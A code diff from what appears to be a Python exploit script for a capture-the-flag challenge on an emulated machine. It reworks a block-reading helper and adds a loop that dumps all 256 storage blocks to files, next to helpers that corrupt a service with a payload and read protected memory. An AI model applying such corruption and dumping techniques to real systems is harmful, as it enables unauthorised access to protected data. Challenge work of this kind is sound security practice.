@@ -361,11 +361,6 @@ def connect_serv3_with_console():
     connect_serv3_corrupt(payload, payload_addr)
     send(console + b"\n")
 
-
-def read_block(blk):
-        exec_asm(f"ld R0 {blk} / ld R1 $3000 / int $04 / ret",return_bytes=False)
-        return read_mem(0x3000, nbytes=0x400)
-
 def read_protected_mem(n):
     result = exec_asm(" ld R2 "+str(n)+" / cmp R2 $0 / jp 0x47 / brk / .lab: dw 0x4948 / dw 0x49F0 / dw 0x6565 / dw 0")[:6]
     if result.endswith(b"Ready"):
@@ -391,3 +386,19 @@ def read_protected_mem_block(addr,ln):
         result = result[:-len(b"Ready.\n> ")]
     return result
 """
+
+def read_block(blk, dump=False):
+    exec_asm(f"ld R0 {blk} / ld R1 $3000 / int $04 / ret",return_bytes=False)
+    return read_mem(0x3000, nbytes=0x400, return_dump=dump)
+
+
+def dump_all_blocks(dirname):
+    for i in range(256):
+        try:
+            blk, dump = read_block(i, dump=True)
+            if any(b for b in blk):
+                with open(f"{dirname}/{hex(i)}", "w") as f:
+                    f.write(dump)
+        except ConnectionClosedException:
+            connect()
+
